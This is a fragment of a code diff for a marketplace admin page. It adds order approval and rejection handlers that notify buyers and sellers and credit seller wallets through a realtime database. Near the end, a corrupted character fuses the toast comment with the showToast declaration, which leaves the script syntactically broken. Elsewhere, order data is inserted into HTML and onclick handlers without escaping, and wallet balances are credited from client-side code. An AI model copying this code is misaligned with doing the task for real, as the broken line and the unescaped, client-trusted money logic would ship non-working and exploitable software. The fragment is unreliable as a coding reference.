+          <div style="font-size:.72rem;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.05em;margin-bottom:4px;">Billing Address</div>
+          <div style="font-size:.82rem;color:rgba(255,255,255,.7);">
+            ${order.billingAddress.street}<br>
+            ${order.billingAddress.city}, ${order.billingAddress.state} ${order.billingAddress.zip}<br>
+            ${order.billingAddress.country}
+          </div>
+        </div>
+        
+        ${order.status === 'pending_admin_auth' ? `
+          <div style="display:flex;gap:10px;margin-top:14px;">
+            <button onclick="approveOrder('${order.key}')" style="flex:1;padding:10px;background:#22c55e;color:#fff;border:none;border-radius:8px;font-family:'DM Sans',sans-serif;font-size:.84rem;font-weight:600;cursor:pointer;">
+              ✅ Authorize & Send to Seller
+            </button>
+            <button onclick="rejectOrder('${order.key}')" style="flex:1;padding:10px;background:#ef4444;color:#fff;border:none;border-radius:8px;font-family:'DM Sans',sans-serif;font-size:.84rem;font-weight:600;cursor:pointer;">
+              ❌ Reject Order
+            </button>
+          </div>
+        ` : `
+          <div style="font-size:.78rem;color:rgba(255,255,255,.35);margin-top:10px;">
+            ${order.approvedAt ? 'Approved: ' + new Date(order.approvedAt).toLocaleString() : ''}
+          </div>
+        `}
+      </div>
+    `;
+  }).join('');
+}
+
+async function approveOrder(orderKey) {
+  if (!confirm('Approve this order? This will notify the seller to ship the items.')) return;
+  
+  const orderSnap = await db.ref('tradex_orders/' + orderKey).once('value');
+  const order = orderSnap.val();
+  
+  if (!order) {
+    showToast('❌ Order not found');
+    return;
+  }
+  
+  // Update order status
+  await db.ref('tradex_orders/' + orderKey).update({
+    status: 'approved',
+    approvedAt: new Date().toISOString(),
+    approvedBy: user.email
+  });
+  
+  // Notify buyer
+  await db.ref('tradex_notifications/' + order.buyerUid).push({
+    msg: `✅ Your order of $${order.total.toFixed(2)} has been authorized! The seller will ship your items soon.`,
+    type: 'order_approved',
+    at: new Date().toISOString(),
+    read: false
+  });
+  
+  // Notify each seller and credit their wallet
+  const sellerUids = [...new Set(order.items.map(item => item.sellerUid || 'demo_seller').filter(Boolean))];
+  for (const sellerUid of sellerUids) {
+    if (sellerUid === 'demo_seller') continue; // Skip demo sellers
+    
+    const sellerItems = order.items.filter(item => (item.sellerUid || 'demo_seller') === sellerUid);
+    const sellerTotal = sellerItems.reduce((sum, item) => sum + (item.price * item.qty), 0);
+    
+    await db.ref('tradex_notifications/' + sellerUid).push({
+      msg: `🎉 New order! You have ${sellerItems.length} item(s) to ship. Total: $${sellerTotal.toFixed(2)}`,
+      type: 'new_sale',
+      orderId: orderKey,
+      at: new Date().toISOString(),
+      read: false
+    });
+    
+    // Add to seller's wallet
+    await db.ref('tradex_wallets/' + sellerUid).transaction(w => {
+      if (!w) w = { balance: 0, totalEarned: 0, pending: 0 };
+      w.balance = (w.balance || 0) + sellerTotal;
+      w.totalEarned = (w.totalEarned || 0) + sellerTotal;
+      return w;
+    });
+  }
+  
+  showToast('✅ Order approved! Seller(s) notified and credited.');
+}
+
+async function rejectOrder(orderKey) {
+  const reason = prompt('Reason for rejection (buyer will see this):');
+  if (!reason) return;
+  
+  const orderSnap = await db.ref('tradex_orders/' + orderKey).once('value');
+  const order = orderSnap.val();
+  
+  if (!order) {
+    showToast('❌ Order not found');
+    return;
+  }
+  
+  await db.ref('tradex_orders/' + orderKey).update({
+    status: 'rejected',
+    rejectedAt: new Date().toISOString(),
+    rejectedBy: user.email,
+    rejectionReason: reason
+  });
+  
+  // Notify buyer
+  await db.ref('tradex_notifications/' + order.buyerUid).push({
+    msg: `⚠️ Your order was not authorized. Reason: ${reason}. No charges have been made.`,
+    type: 'order_rejected',
+    at: new Date().toISOString(),
+    read: false
+  });
+  
+  showToast('❌ Order rejected. Buyer notified.');
+}
+
 function adminLogout(){
   logout();
 }
@@ -1480,9 +2184,14 @@ function openModal(id){document.getElementById(id).classList.add('active');}
 function closeModal(id){document.getElementById(id).classList.remove('active');}
 document.querySelectorAll('.modal-overlay').forEach(o=>o.addEventListener('click',e=>{if(e.target===o)o.classList.remove('active');}));
 
-// ── TOAST ─────────────────────────────────────────────────────────────────────
-let tt;
-function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');clearTimeout(tt);tt=setTimeout(()=>t.classList.remove('show'),2400);}
+// ── TOAST ────────────────────────────────────────────────────────────────�function showToast(msg){
+  const t=document.createElement('div');
+  t.className='toast';
+  t.textContent=msg;
+  document.body.appendChild(t);
+  setTimeout(()=>t.classList.add('show'),10);
+  setTimeout(()=>{t.classList.remove('show');setTimeout(()=>t.remove(),300);},3000);
+}
 </script>
 </body>
 </html>
